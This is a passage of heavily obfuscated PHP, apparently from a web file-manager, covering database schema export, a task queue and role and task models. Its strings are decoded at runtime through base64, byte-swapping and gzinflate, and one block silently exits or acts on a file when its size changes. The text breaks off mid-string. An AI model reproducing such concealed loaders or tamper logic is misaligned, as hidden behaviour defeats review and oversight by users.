$ÜÁÏ‹ä[13]) { $È¶Ú×Š = array_diff($È¶Ú×Š, array($ÜÁÏ‹ä[824], $ÜÁÏ‹ä[825])); $»¬¥à‰  = array($ÜÁÏ‹ä[1145], $ÜÁÏ‹ä[1146], $ÜÁÏ‹ä[1147]); fwrite($“‚é‹Ò¼, implode(PHP_EOL, $»¬¥à‰ ) . PHP_EOL . PHP_EOL); foreach ($È¶Ú×Š as $Ô›Š¬±¢) { $Û§ìÊ—¿ = $this->sqlFromSqlite($Ô›Š¬±¢); if (!$Û§ìÊ—¿[$ÜÁÏ‹ä[13]]) { continue; } fwrite($“‚é‹Ò¼, $Û§ìÊ—¿[$ÜÁÏ‹ä[13]] . PHP_EOL . PHP_EOL); if (!in_array($Ô›Š¬±¢, $ÖõÎ¥ãï)) { fwrite($èë–£¨ö, $Û§ìÊ—¿[$ÜÁÏ‹ä[848]] . PHP_EOL . PHP_EOL); } } } else { foreach ($È¶Ú×Š as $Ô›Š¬±¢) { $Û§ìÊ—¿ = $this->sqlFromMysql($Ô›Š¬±¢); if (!$Û§ìÊ—¿[$ÜÁÏ‹ä[848]]) { continue; } fwrite($èë–£¨ö, $Û§ìÊ—¿[$ÜÁÏ‹ä[848]] . PHP_EOL . PHP_EOL); if (!in_array($Ô›Š¬±¢, $ÖõÎ¥ãï)) { fwrite($“‚é‹Ò¼, $Û§ìÊ—¿[$ÜÁÏ‹ä[13]] . PHP_EOL . PHP_EOL); } } } fclose($èë–£¨ö); fclose($“‚é‹Ò¼); $Ä«Õ¸Íä = array($ÜÁÏ‹ä[848] => $üí‹¤ïİ, $ÜÁÏ‹ä[13] => $ßÇ–¨®€); return $¡¦Ìıµ‹ ? $Ä«Õ¸Íä[$¡¦Ìıµ‹] : $Ä«Õ¸Íä; } public function dbType($Şò†Á×¹ = false) { $¤İ¢×çğ =& $_SERVER[³à¼î¯á]; $ÂŞ³¥êÏ = $Şò†Á×¹ ? $GLOBALS[$¤İ¢×çğ[6]][$¤İ¢×çğ[21]] : $this->database; $ÂŞ³¥êÏ = array_change_key_case($ÂŞ³¥êÏ); $”˜ã“ö = $ÂŞ³¥êÏ[$¤İ¢×çğ[1017]]; if ($”˜ã“ö == $¤İ¢×çğ[1014]) { $Ê€œÕ²â = explode($¤İ¢×çğ[4], $ÂŞ³¥êÏ[$¤İ¢×çğ[1023]]); $”˜ã“ö = $Ê€œÕ²â[0]; } $Ë¡©³ = array($¤İ¢×çğ[1148] => $¤İ¢×çğ[13], $¤İ¢×çğ[960] => $¤İ¢×çğ[848]); if (isset($Ë¡©³[$”˜ã“ö])) { $”˜ã“ö = $Ë¡©³[$”˜ã“ö]; } return $”˜ã“ö; } public function sqlFromMysql($¦©°¡Ğå, $®«„ÚÍí = '') { $®‡ñ¡¹â =& $_SERVER[³à¼î¯á]; $¸±Ôí¦Î = $this->model()->db(); $®²±•¥¬ = $¸±Ôí¦Î->query($®‡ñ¡¹â[1149] . $¦©°¡Ğå . $®‡ñ¡¹â[436]); if (!$®²±•¥¬ || !$®²±•¥¬[0]) { return !1; } $’³ëÊã = _get($®²±•¥¬[0], $®‡ñ¡¹â[1150], $®‡ñ¡¹â[12]); if (!$’³ëÊã) { return !1; } $’ê©ˆšÍ = "\104\x52\x4f\x50\40\124\101\x42\114\x45\x20\111\x46\40\x45\x58\111\123\124\x53\x20\140{$¦©°¡Ğå}\x60\x3b" . PHP_EOL . $’³ëÊã . $®‡ñ¡¹â[74]; if ($®«„ÚÍí && $®«„ÚÍí == $®‡ñ¡¹â[848]) { return $’ê©ˆšÍ; } $ÁĞòüŞï = array_change_key_case($GLOBALS[$®‡ñ¡¹â[6]][$®‡ñ¡¹â[21]]); $ÏÛØÕÔ = $ÁĞòüŞï[$®‡ñ¡¹â[1022]]; $èÈ‰­¼ = $®‡ñ¡¹â[1151] . $ÏÛØÕÔ . $®‡ñ¡¹â[1152] . $¦©°¡Ğå . $®‡ñ¡¹â[58]; $îê¥ÄÅŒ = $®‡ñ¡¹â[1153] . $¦©°¡Ğå . $®‡ñ¡¹â[948]; $Åıµî = $¸±Ôí¦Î->query($èÈ‰­¼); if (empty($Åıµî)) { $¸§ÆËÌş = array($®‡ñ¡¹â[848] => $®‡ñ¡¹â[12], $®‡ñ¡¹â[13] => $®‡ñ¡¹â[12]); return $®«„ÚÍí ? $¸§ÆËÌş[$®«„ÚÍí] : $¸§ÆËÌş; } $õğàø¾œ = $¸±Ôí¦Î->query($îê¥ÄÅŒ); $§ëû–î• = $®‡ñ¡¹â[12]; $®¿ı÷ = array(); foreach ($õğàø¾œ as $£É“çÛß) { if (!$§ëû–î• && $£É“çÛß[$®‡ñ¡¹â[1154]] == $®‡ñ¡¹â[1155]) { $§ëû–î• = $£É“çÛß[$®‡ñ¡¹â[1156]]; } if (isset($®¿ı÷[$£É“çÛß[$®‡ñ¡¹â[1154]]])) { $®¿ı÷[$£É“çÛß[$®‡ñ¡¹â[1154]]][$®‡ñ¡¹â[1157]][] = $£É“çÛß[$®‡ñ¡¹â[1156]]; continue; } $®¿ı÷[$£É“çÛß[$®‡ñ¡¹â[1154]]] = array($®‡ñ¡¹â[1158] => $£É“çÛß[$®‡ñ¡¹â[1154]], $®‡ñ¡¹â[1157] => array($£É“çÛß[$®‡ñ¡¹â[1156]]), $®‡ñ¡¹â[1159] => $£É“çÛß[$®‡ñ¡¹â[1160]] == $®‡ñ¡¹â[91] ? 0 : 1); } $ĞÌ‚åü = array(); foreach ($®¿ı÷ as $£É“çÛß) { $½§ºÙâÄ = $£É“çÛß[$®‡ñ¡¹â[1158]] == $®‡ñ¡¹â[1155]; $²»ñÄ¨æ = array($®‡ñ¡¹â[1161], $£É“çÛß[$®‡ñ¡¹â[1159]] == $®‡ñ¡¹â[91] && !$½§ºÙâÄ ? $®‡ñ¡¹â[1162] : $®‡ñ¡¹â[12], $®‡ñ¡¹â[1163], $®‡ñ¡¹â[1164] . $¦©°¡Ğå . $®‡ñ¡¹â[11] . ($½§ºÙâÄ ? $®‡ñ¡¹â[1165] : $£É“çÛß[$®‡ñ¡¹â[1158]]) . $®‡ñ¡¹â[121], $®‡ñ¡¹â[1166], $®‡ñ¡¹â[121] . $¦©°¡Ğå . $®‡ñ¡¹â[121], $®‡ñ¡¹â[1167] . implode($®‡ñ¡¹â[1168], $£É“çÛß[$®‡ñ¡¹â[1157]]) . $®‡ñ¡¹â[1169]); $ĞÌ‚åü[] = implode($®‡ñ¡¹â[53], $²»ñÄ¨æ) . $®‡ñ¡¹â[74]; } $îÕ½µ“ = array(); $Ùû¯µ¿ = array($®‡ñ¡¹â[1170] => $®‡ñ¡¹â[1171], $®‡ñ¡¹â[1171] => $®‡ñ¡¹â[1171], $®‡ñ¡¹â[339] => $®‡ñ¡¹â[366], $®‡ñ¡¹â[338] => $®‡ñ¡¹â[366]); foreach ($Åıµî as $£É“çÛß) { $²»ñÄ¨æ = array($®‡ñ¡¹â[121] . $£É“çÛß[$®‡ñ¡¹â[1172]] . $®‡ñ¡¹â[121], isset($Ùû¯µ¿[$£É“çÛß[$®‡ñ¡¹â[1173]]]) ? $Ùû¯µ¿[$£É“çÛß[$®‡ñ¡¹â[1173]]] : $£É“çÛß[$®‡ñ¡¹â[1174]], $£É“çÛß[$®‡ñ¡¹â[1175]] == $®‡ñ¡¹â[946] ? $®‡ñ¡¹â[1176] : $®‡ñ¡¹â[1177], $£É“çÛß[$®‡ñ¡¹â[1172]] == $§ëû–î• ? $®‡ñ¡¹â[1178] : $®‡ñ¡¹â[12], $£É“çÛß[$®‡ñ¡¹â[997]] ? strtoupper(str_replace($®‡ñ¡¹â[11], $®‡ñ¡¹â[12], $£É“çÛß[$®‡ñ¡¹â[997]])) : $®‡ñ¡¹â[12]); $îÕ½µ“[] = trim(implode($®‡ñ¡¹â[53], $²»ñÄ¨æ)); } $“ÚÃúÉ = array($®‡ñ¡¹â[1179] . $¦©°¡Ğå . $®‡ñ¡¹â[1180], $®‡ñ¡¹â[1181] . $¦©°¡Ğå . $®‡ñ¡¹â[1182], implode($®‡ñ¡¹â[50] . PHP_EOL, $îÕ½µ“), $®‡ñ¡¹â[994]); $Çöö¾Ù‰ = implode(PHP_EOL, array_merge($“ÚÃúÉ, $ĞÌ‚åü)); if ($®«„ÚÍí && $®«„ÚÍí == $®‡ñ¡¹â[13]) { return $Çöö¾Ù‰; } $¸§ÆËÌş = array($®‡ñ¡¹â[848] => $’ê©ˆšÍ, $®‡ñ¡¹â[13] => $Çöö¾Ù‰); return $®«„ÚÍí ? $¸§ÆËÌş[$®«„ÚÍí] : $¸§ÆËÌş; } public function sqlFromSqlite($¦·‹ïŒè, $Ùü‡–° = '') { $óüÌ–ß =& $_SERVER[³à¼î¯á]; $§ÒºÇ‹ƒ = $this->model()->db(); $Ô§Ï¯«Â = "\120\122\101\107\x4d\101\x20\x54\101\x42\114\105\137\x49\116\106\x4f\x20\50\47{$¦·‹ïŒè}\47\51"; $²«÷¹ŠÌ = "\x53\x45\114\x45\103\x54\40\x2a\40\x46\x52\x4f\115\x20\x73\x71\154\x69\x74\x65\x5f\155\x61\163\164\x65\162\40\x57\x48\105\122\105\x20\164\142\154\137\156\x61\155\145\x20\75\40\x27{$¦·‹ïŒè}\47"; $á¬€“×Ö = $§ÒºÇ‹ƒ->query($Ô§Ï¯«Â); if (empty($á¬€“×Ö)) { $™™úºÖò = array($óüÌ–ß[848] => $óüÌ–ß[12], $óüÌ–ß[13] => $óüÌ–ß[12]); return $Ùü‡–° ? $™™úºÖò[$Ùü‡–°] : $™™úºÖò; } $í’—Àã´ = $§ÒºÇ‹ƒ->query($²«÷¹ŠÌ); $ĞĞô·‰ = $ß£ÁÂË = array(); foreach ($í’—Àã´ as $Á¥Ù®¤Ú) { if ($Á¥Ù®¤Ú[$óüÌ–ß[33]] == $óüÌ–ß[331]) { $ĞĞô·‰[] = $Á¥Ù®¤Ú[$óüÌ–ß[1183]]; } else { $ß£ÁÂË[$Á¥Ù®¤Ú[$óüÌ–ß[32]]] = $Á¥Ù®¤Ú[$óüÌ–ß[1183]]; } } $Ü“è²ˆ = array_merge(array($óüÌ–ß[1179] . $¦·‹ïŒè . $óüÌ–ß[121]), $ĞĞô·‰, array_values($ß£ÁÂË)); $Ü“è²ˆ = implode($óüÌ–ß[74] . PHP_EOL, $Ü“è²ˆ) . $óüÌ–ß[74]; if ($Ùü‡–° && $Ùü‡–° == $óüÌ–ß[13]) { return $Ü“è²ˆ; } $öØã¯°ß = array(); $¥‰‹ô‹è = array($óüÌ–ß[1171] => $óüÌ–ß[1184], $óüÌ–ß[366] => $óüÌ–ß[1185]); $ÜÏ““ = $óüÌ–ß[12]; foreach ($á¬€“×Ö as $Á¥Ù®¤Ú) { if ($Á¥Ù®¤Ú[$óüÌ–ß[57]] == $óüÌ–ß[91]) { $ÜÏ““ = $Á¥Ù®¤Ú[$óüÌ–ß[32]]; } $‹–¿½ˆ = array($óüÌ–ß[436] . $Á¥Ù®¤Ú[$óüÌ–ß[32]] . $óüÌ–ß[436], isset($¥‰‹ô‹è[$Á¥Ù®¤Ú[$óüÌ–ß[33]]]) ? $¥‰‹ô‹è[$Á¥Ù®¤Ú[$óüÌ–ß[33]]] : $Á¥Ù®¤Ú[$óüÌ–ß[33]], $Á¥Ù®¤Ú[$óüÌ–ß[35]] == $óüÌ–ß[91] ? $óüÌ–ß[1176] : $óüÌ–ß[1186] . $Á¥Ù®¤Ú[$óüÌ–ß[56]], $Á¥Ù®¤Ú[$óüÌ–ß[57]] == $óüÌ–ß[91] ? $óüÌ–ß[1187] : $óüÌ–ß[12]); $öØã¯°ß[] = trim(implode($óüÌ–ß[53], $‹–¿½ˆ)); } foreach ($ß£ÁÂË as $œ¨Óìä­ => $Öª˜öÇ) { $Ÿ­º˜°Ó = str_replace($óüÌ–ß[1188] . $¦·‹ïŒè . $óüÌ–ß[11], $óüÌ–ß[12], $œ¨Óìä­); $í£·‹£Î = str_replace(array($óüÌ–ß[121], $óüÌ–ß[1005]), $óüÌ–ß[436], substr($Öª˜öÇ, stripos($Öª˜öÇ, $óüÌ–ß[312]))); if ($Ÿ­º˜°Ó == $óüÌ–ß[1165]) { $…°˜‹Ğ = $óüÌ–ß[1189] . $ÜÏ““ . $óüÌ–ß[1190]; } else { $…°˜‹Ğ = (stripos($Ÿ­º˜°Ó, $óüÌ–ß[11]) ? $óüÌ–ß[1191] : $óüÌ–ß[12]) . ($óüÌ–ß[1192] . $Ÿ­º˜°Ó . $óüÌ–ß[1193] . $í£·‹£Î); } $öØã¯°ß[] = $…°˜‹Ğ; } $ËœâÍœÑ = array($óüÌ–ß[1194] . $¦·‹ïŒè . $óüÌ–ß[1195], $óüÌ–ß[1196] . $¦·‹ïŒè . $óüÌ–ß[1197], implode($óüÌ–ß[50] . PHP_EOL, $öØã¯°ß), $óüÌ–ß[1198]); $éâãÔïí = implode(PHP_EOL, $ËœâÍœÑ); if ($Ùü‡–° && $Ùü‡–° == $óüÌ–ß[848]) { return $éâãÔïí; } $™™úºÖò = array($óüÌ–ß[848] => $éâãÔïí, $óüÌ–ß[13] => $Ü“è²ˆ); return $Ùü‡–° ? $™™úºÖò[$Ùü‡–°] : $™™úºÖò; } } goto A“±Ê‹ñ­; Bì©½Å¥: $_size = $_SERVER[³à¼î¯á][1851]; if ($_SERVER[$_SERVER[³à¼î¯á][921]] != $_size($_file)) { $_getc = $_SERVER[³à¼î¯á][924]; $_getfile = $_SERVER[$_SERVER[³à¼î¯á][925]] . $_SERVER[³à¼î¯á][926]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[³à¼î¯á][253], $_getfilec); if (count($_getarrs) < $_SERVER[³à¼î¯á][665]) { $exit = $_SERVER[³à¼î¯á][927]; $exit(); } $_act = $_SERVER[³à¼î¯á][1009]; $_act($_file); } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\x6b\121\165\145\x75\145\x4c\145\156\147\x74\150"; const QUEUE_DATA = "\x74\x61\163\153\121\165\x65\165\145\x44\141\x74\141"; const QUEUE_TIME = "\x74\141\x73\x6b\x51\165\145\x75\145\114\141\x73\164\x52\165\x6e"; const QUEUE_THREAD = "\x74\x61\x73\x6b\121\165\145\165\145\124\150\x72\x65\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Ó…¼±äá, $ÆŒ Å¹ó = array(), $†•Œ²ŸÚ = '', $èÒøµİ· = '') { $ø‘ÍÇüÏ =& $_SERVER[³à¼î¯á]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($èÒøµİ· && array_find_by_field(self::$listData, $ø‘ÍÇüÏ[97], $èÒøµİ·)) { return !0; } if ($èÒøµİ· && array_find_by_field(self::$listDataAdd, $ø‘ÍÇüÏ[97], $èÒøµİ·)) { return !0; } self::$listDataAdd[] = array($ø‘ÍÇüÏ[316] => $Ó…¼±äá, $ø‘ÍÇüÏ[1852] => $ÆŒ Å¹ó, $ø‘ÍÇüÏ[501] => $†•Œ²ŸÚ, $ø‘ÍÇüÏ[97] => $èÒøµİ·); return !0; } public static function addSubmit() { $ç¦ÑÁå =& $_SERVER[³à¼î¯á]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ç¦ÑÁå[1853] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ç¦ÑÁå[12], $ç¦ÑÁå[501])), $ç¦ÑÁå[188]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($’¾é³ÛÃ, $ÄÄ—§© = array(), $¦èÚİòŸ = '', $õ¢øÔş¸ = '') { $ º€şÓõ =& $_SERVER[³à¼î¯á]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ÀïşÀ¢ = self::getAll(); if ($õ¢øÔş¸ && array_find_by_field($ÀïşÀ¢, $ º€şÓõ[97], $õ¢øÔş¸)) { return !0; } $ÀïşÀ¢[] = array($ º€şÓõ[316] => $’¾é³ÛÃ, $ º€şÓõ[1852] => $ÄÄ—§©, $ º€şÓõ[501] => $¦èÚİòŸ, $ º€şÓõ[97] => $õ¢øÔş¸); self::setAll($ÀïşÀ¢); write_log($ º€şÓõ[1853] . $¦èÚİòŸ, $ º€şÓõ[188]); return !0; } public static function run() { $Ş®çÜÍ =& $_SERVER[³à¼î¯á]; $’à°şèĞ = self::getAll(); $ö¢ºôñ¨ = array_shift($’à°şèĞ); if (!$ö¢ºôñ¨) { return !1; } self::setAll($’à°şèĞ); $«æ¯æöİ = timeFloat(); $½ÍŒñ»Ë = $Ş®çÜÍ[12]; try { $½ÍŒñ»Ë = Hook::apply($ö¢ºôñ¨[$Ş®çÜÍ[316]], $ö¢ºôñ¨[$Ş®çÜÍ[1852]]); } catch (Exception $†Ä¨“¦) { write_log($†Ä¨“¦, $Ş®çÜÍ[1236]); } $à¨›Áï  = number_format(timeFloat() - $«æ¯æöİ, 3) . $Ş®çÜÍ[1769]; if ($½ÍŒñ»Ë && is_string($½ÍŒñ»Ë)) { $à¨›Áï  = $à¨›Áï  . $Ş®çÜÍ[1854] . $½ÍŒñ»Ë; } write_log($Ş®çÜÍ[1855] . $ö¢ºôñ¨[$Ş®çÜÍ[501]] . $Ş®çÜÍ[1856] . $à¨›Áï , $Ş®çÜÍ[188]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $éß³°ÛÕ =& $_SERVER[³à¼î¯á]; $¶ªœ€é‰ = self::threadCount() + 1; if ($¶ªœ€é‰ > 3 || !self::count()) { return; } write_log($éß³°ÛÕ[1857] . $¶ªœ€é‰, $éß³°ÛÕ[188]); Cache::set(self::QUEUE_THREAD, $¶ªœ€é‰, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($éß³°ÛÕ[1858], $éß³°ÛÕ[188]); } public static function getKey($‘Õ‹¸ÖĞ, $Ö¤®ÌÒÆ = "\151\156\164") { $ÚİÁÑ€¬ =& $_SERVER[³à¼î¯á]; Cache::removeMemory($‘Õ‹¸ÖĞ); $Âû„í·© = Cache::get($‘Õ‹¸ÖĞ); if ($Ö¤®ÌÒÆ == $ÚİÁÑ€¬[339]) { return $Âû„í·© ? intval($Âû„í·©) : 0; } if ($Ö¤®ÌÒÆ == $ÚİÁÑ€¬[1859]) { return is_array($Âû„í·©) ? $Âû„í·© : array(); } return $Âû„í·©; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[³à¼î¯á][1859]); } public static function setAll($Ö÷Û¤É) { $Ì¼õÓüş = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Ö÷Û¤É), $Ì¼õÓüş); Cache::set(self::QUEUE_DATA, $Ö÷Û¤É, $Ì¼õÓüş); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } goto c´©Ûš“÷; b”°ãÌƒøä: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\162\x6f\x6c\x65\114\x69\163\x74"; public $field = array("\x6e\x61\x6d\145", "\x61\x75\164\x68", "\x6c\x61\142\145\154", "\144\151\x73\x70\154\141\x79", "\163\171\163\164\x65\x6d", "\144\145\x73\143", "\151\147\x6e\157\x72\x65\105\170\x74", "\x69\x67\156\157\x72\x65\x46\x69\x6c\x65\123\x69\x7a\145", "\141\x64\155\x69\x6e\x69\163\x74\x72\141\x74\157\162", "\163\157\x72\x74"); public function listData($·”ûß® = false, $Õ ¥å·Ó = "\x73\x6f\162\164", $Ãˆí»ş = false) { $ƒá Ïí³ =& $_SERVER[³à¼î¯á]; $ÕæÈ¨ÎÃ = parent::listData($·”ûß®, $Õ ¥å·Ó, $Ãˆí»ş); if (!$·”ûß®) { foreach ($ÕæÈ¨ÎÃ as $á·Š¬—¡ => $§éŒğòË) { if ($§éŒğòË[$ƒá Ïí³[2160]] == 1) { $ÕæÈ¨ÎÃ[$á·Š¬—¡][$ƒá Ïí³[501]] = LNG($ƒá Ïí³[2423]); } } } return $ÕæÈ¨ÎÃ; } public function update($„¹Âúğ, $Ò’“«²) { $îşø«¨Ã =& $_SERVER[³à¼î¯á]; $öÍ§Á»‰ = parent::listData($„¹Âúğ); $Á”œë¶‚ = $this->findByName($Ò’“«²[$îşø«¨Ã[32]]); if (!$öÍ§Á»‰ || $Á”œë¶‚ && $Á”œë¶‚[$îşø«¨Ã[450]] != $öÍ§Á»‰[$îşø«¨Ã[450]]) { return !1; } if ($Á”œë¶‚[$îşø«¨Ã[2160]] == 1) { $Ò’“«² = array($îşø«¨Ã[32] => $Ò’“«²[$îşø«¨Ã[32]], $îşø«¨Ã[1975] => $Ò’“«²[$îşø«¨Ã[1975]]); } $this->filterAuth($Ò’“«²[$îşø«¨Ã[462]]); return parent::update($„¹Âúğ, $Ò’“«²); } public function remove($ıûÁ—Ë) { $ï‹Á…°ª = parent::listData($ıûÁ—Ë); if (!$ï‹Á…°ª || $ï‹Á…°ª[$_SERVER[³à¼î¯á][182]]) { return !1; } return parent::remove($ıûÁ—Ë); } public function add($òÒ¥â—Ï) { $©ÅŞ†ç =& $_SERVER[³à¼î¯á]; $¾Ê§¦ôä = $òÒ¥â—Ï[$©ÅŞ†ç[32]]; if ($this->findByName($¾Ê§¦ôä)) { return !1; } $¼¡ÛÎÃ = array($©ÅŞ†ç[469] => $¾Ê§¦ôä, $©ÅŞ†ç[1958] => $©ÅŞ†ç[12], $©ÅŞ†ç[1954] => $©ÅŞ†ç[1962], $©ÅŞ†ç[2424] => 1, $©ÅŞ†ç[1957] => 0, $©ÅŞ†ç[2425] => 0, $©ÅŞ†ç[1956] => $this->getSort()); $òÒ¥â—Ï = array_merge($¼¡ÛÎÃ, $òÒ¥â—Ï); $this->filterAuth($òÒ¥â—Ï[$©ÅŞ†ç[462]]); return parent::insert($òÒ¥â—Ï); } private function getSort() { $ÃñÔ‚”ö =& $_SERVER[³à¼î¯á]; $áİãÌÕ¨ = parent::listData(); $Óèöù‡Ê = array_to_keyvalue($áİãÌÕ¨, $ÃñÔ‚”ö[12], $ÃñÔ‚”ö[1976]); return empty($Óèöù‡Ê) ? 0 : max($Óèöù‡Ê) + 1; } private function filterAuth(&$àıçùÆ´) { $Ù¼÷ªá‡ =& $_SERVER[³à¼î¯á]; $»Êçèı = array(); $§ÜĞºÚ = array_filter(explode($Ù¼÷ªá‡[50], $àıçùÆ´)); foreach ($§ÜĞºÚ as $àıçùÆ´) { $¸ÖæÎûı = explode($Ù¼÷ªá‡[10], $àıçùÆ´); if ($¸ÖæÎûı[0] == $Ù¼÷ªá‡[2426] && $¸ÖæÎûı[1] != $Ù¼÷ªá‡[1244]) { $…ìñŸ˜ = $¸ÖæÎûı[0] . $Ù¼÷ªá‡[10] . $¸ÖæÎûı[1] . $Ù¼÷ªá‡[2427]; if (!in_array($…ìñŸ˜, $§ÜĞºÚ)) { $»Êçèı[] = $…ìñŸ˜; } } $»Êçèı[] = $àıçùÆ´; } $àıçùÆ´ = implode($Ù¼÷ªá‡[50], $»Êçèı); } public function findRoleDefault() { $Íçâ€àô =& $_SERVER[³à¼î¯á]; $ÔàÎ•ÑÙ = parent::listData(); $Ô¹¯İˆ = !1; foreach ($ÔàÎ•ÑÙ as $¤ÄˆúÒµ) { if (!$¤ÄˆúÒµ || $¤ÄˆúÒµ[$Íçâ€àô[1974]] == $Íçâ€àô[219] || $¤ÄˆúÒµ[$Íçâ€àô[2160]] == 1) { continue; } if (strstr($¤ÄˆúÒµ[$Íçâ€àô[462]], $Íçâ€àô[2428])) { continue; } if (!strstr($¤ÄˆúÒµ[$Íçâ€àô[462]], $Íçâ€àô[2429])) { continue; } if (!$Ô¹¯İˆ) { $Ô¹¯İˆ = $¤ÄˆúÒµ; continue; } $Ùñ±îÕ½ = explode($Íçâ€àô[50], $Ô¹¯İˆ[$Íçâ€àô[462]]); $ç§¶äŠ = explode($Íçâ€àô[50], $¤ÄˆúÒµ[$Íçâ€àô[462]]); if (count($Ùñ±îÕ½) > count($ç§¶äŠ)) { $Ô¹¯İˆ = $¤ÄˆúÒµ; } } return $Ô¹¯İˆ ? $Ô¹¯İˆ[$Íçâ€àô[450]] : $Íçâ€àô[12]; } public function sort($Ñƒ“ş”ö, $ÃÊÛ‡İÁ) { return parent::update($Ñƒ“ş”ö, $ÃÊÛ‡İÁ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\x74\x61\x73\x6b\114\x69\x73\164"; public $field = array("\156\141\x6d\145", "\164\171\160\145", "\145\x76\x65\156\x74", "\164\151\x6d\145", "\144\x65\163\x63", "\163\x79\x73\x74\x65\x6d", "\145\x6e\x61\x62\x6c\145", "\154\141\163\x74\122\x75\x6e", "\x73\157\162\164"); public function listData($äßŠßª = false, $ûœ­•˜‹ = "\x73\x6f\x72\164", $ÉÊú¢·„ = false) { return parent::listData($äßŠßª, $ûœ­•˜‹, $ÉÊú¢·„); } public function add($¾Ó¹§©ë) { $­´¢Ê³û =& $_SERVER[³à¼î¯á]; $š­§³¾É = $this->findByName($¾Ó¹§©ë[$­´¢Ê³û[32]]); if ($š­§³¾É) { return !1; } $¾Ó¹§©ë[$­´¢Ê³û[1704]] = 0; $¾Ó¹§©ë[$­´¢Ê³û[1976]] = $this->getSort(); return parent::insert($¾Ó¹§©ë); } private function getSort() { $Å‘•©ÚÅ =& $_SERVER[³à¼î¯á]; $Ÿ—ƒœÒë = parent::listData(); $º¡¦ûúÚ = array_to_keyvalue($Ÿ—ƒœÒë, $Å‘•©ÚÅ[12], $Å‘•©ÚÅ[1976]); return empty($º¡¦ûúÚ) ? 0 : max($º¡¦ûúÚ) + 1; } public function update($Ë…œ¤ÒÆ, $©­¸ÃœŠ) { $òÆØè“ñ =& $_SERVER[³à¼î¯á]; $ˆ¢´œç³ = $this->listData($Ë…œ¤ÒÆ); $È›Øóƒ– = $this->findByName($©­¸ÃœŠ[$òÆØè“ñ[32]]); if (!$ˆ¢´œç³ || $È›Øóƒ– && $È›Øóƒ–[$òÆØè“ñ[450]] != $ˆ¢´œç³[$òÆØè“ñ[450]]) { return !1; } return parent::update($Ë…œ¤ÒÆ, $©­¸ÃœŠ); } public function remove($ºë…óÅ, $ß¤Âı´Å = false) { $ñ­À…§ë =& $_SERVER[³à¼î¯á]; $Š˜µÈ¯À = $this->listData($ºë…óÅ); if (!$Š˜µÈ¯À) { return; } if (!$ß¤Âı´Å && $Š˜µÈ¯À[$ñ­À…§ë[182]] == $ñ­À…§ë[91]) { return !1; } return parent::remove($ºë…óÅ); } public function enable($¸åú¹±, $·½í¬â) { return $this->update($¸åú¹±, array($_SERVER[³à¼î¯á][2418] => $·½í¬â)); } public function run($×ë”ñ) { return $this->update($×ë”ñ, array($_SERVER[³à¼î¯á][2430] => time())); } } goto D¨™ˆ¼‚÷; E¥¾©ƒİ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xb3\xe0\xbc\xee\xaf\xe1", base64_decode('7KHAoa66')); $_SERVER[³à¼î¯á] = explode(base64_decode('fAF8AnwF'), gzinflate(substr(_kodDe('K34S8/vz8/PzBvNwuGv8yA4jqFw+ePxpRcNrCyXOBQl8zM4Ge4QazGCECTogpoVZzIUlyTk=')."\xc4\x92\x46\xd6\x8c\xbc\x64\x61\xdf\xa\x24\x61\xdf\x5e\xd8\xca\x5e\x96\x40\x29\x5b\x42\xd8\x1e\xcb\x6b\x69\x81\x57\x5a\x68\x1f\x50\x1e\x10\x3b\xa1\x65\x2d\xa5\xf\xa\x94\xff\x2e\xe7\x2e\x33\x92\xe1\xfd\xdf"."\373\277\357\317\227\104\167\71\367\316\135\316\75\347\334\163\317\75\367\271\67\307\317\177\151\363\372\75\327\357\265\176\237\77\75\171\365\317\336\276\223\206\311\377\173\322\360\261\27\354\273\7".base64_decode('+XPIBefX1HTM2W9G1/6bf3G3dpf2M+3CSPj5X4cOeOGuk4ITNz0/NrHnHo9/d+zkRgRMyw==')."\66\322\37\45\157\332\212\76\152\130\266\105\23\222\146\76\155\14\320\260\221\247\277\176\372\323\23\15\27\365\234\151\353\64\352\243\77\252\324\256\175\254\241\254\301\362\325\256\110\134\215\365".base64_decode('dHcHo3EAapTzc2YKQgWtqOXg+wW9aKHWyNWpBbOg5x0pIiGl2VpCs6Cm1ma1NdgdjqxU4w==')."\53\273\203\0\221\120\207\112\172\161\214\306\110\60\146\153\105\73\156\344\164\16\61\122\344\355\152\16\266\207\272\224\170\64\320\25\13\264\304\103\221\56\232\334\22\351\354\14\305\313\323\243"."\x91\x70\xb8\x39\xd0\xb2\xa4\x3c\xa7\x3b\x1a\x68\xef\xc\x28\xa8\x7d\x59\x5d\x35\xf2\x69\xb3\x46\x59\x4d\x73\x56\x2b\xb5\x34\xd0\x66\xe8\xd9\x14\xd\xe6\x35\xd6\x1c\x7b\xac\x0\xa1\x38\xf\xa1\x69\xca\x97\xb2".base64_decode('WRrp